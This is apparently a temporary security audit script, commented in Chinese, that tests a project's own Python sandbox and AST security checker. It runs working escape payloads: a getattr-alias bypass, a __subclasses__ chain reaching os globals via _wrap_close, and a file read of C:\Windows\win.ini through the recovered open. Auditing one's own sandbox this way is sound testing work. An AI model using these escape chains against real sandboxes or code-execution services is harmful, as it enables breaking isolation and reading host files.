"""临时审计脚本 2：验证 getattr 别名绕过 + 完整逃逸链（运行后删除）"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from app.services.sandbox.sandbox import run_code
from app.services.sandbox.security_check import SecurityChecker

def show(title, payload, timeout=8):
    print("-" * 72)
    print("载荷:", payload.replace("\n", " ⏎ "))
    checker = SecurityChecker()
    ok, errs = checker.check_code(payload)
    print("  AST 安全检查通过(未被拦截):", ok, "" if ok else [e["message"] for e in errs])
    r = run_code(payload, timeout=timeout)
    print("  沙箱 success:", r["success"])
    print("  输出:", repr((r["output"] or "").strip()[:300]))
    if r["errors"]:
        print("  错误:", [(e.get("type"), e.get("message")) for e in r["errors"]])
    return r

print("=" * 72)
print("A. 别名绕过：visit_Call 只看 ast.Name，把 getattr 赋值给变量即可")
print("=" * 72)
show("alias", "g = getattr\nprint(g(1, '__class__'))")

print()
print("=" * 72)
print("B. 完整逃逸链：从 int 走到 __subclasses__，定位 os 模块")
print("=" * 72)
payload_b = """
g = getattr
obj = g(1, '__class__')
mro = g(obj, '__mro__')
subs = g(mro[1], '__subclasses__')()
names = [g(c, '__name__') for c in subs]
print('subclass_count=', len(subs))
print('has_wrap_close=', '_wrap_close' in names)
for c in subs:
    if g(c, '__name__') == '_wrap_close':
        glb = g(g(c, '__init__'), '__globals__')
        print('REACHED_OS_MODULE=', 'os' in glb or 'sys' in glb)
        break
"""
show("escape-chain", payload_b)

print()
print("=" * 72)
print("C. 是否真的能读文件（逃逸成功的最终证明）")
print("=" * 72)
payload_c = """
g = getattr
subs = g(g(g(1, '__class__'), '__mro__')[1], '__subclasses__')()
for c in subs:
    if g(c, '__name__') == '_wrap_close':
        glb = g(g(c, '__init__'), '__globals__')
        builtins_mod = glb['__builtins__']
        op = builtins_mod['open'] if isinstance(builtins_mod, dict) else g(builtins_mod, 'open')
        data = op(r'C:\\Windows\\win.ini', 'r').read(60)
        print('FILE_READ_OK:', data.replace(chr(10), ' '))
        break
"""
show("file-read", payload_c)
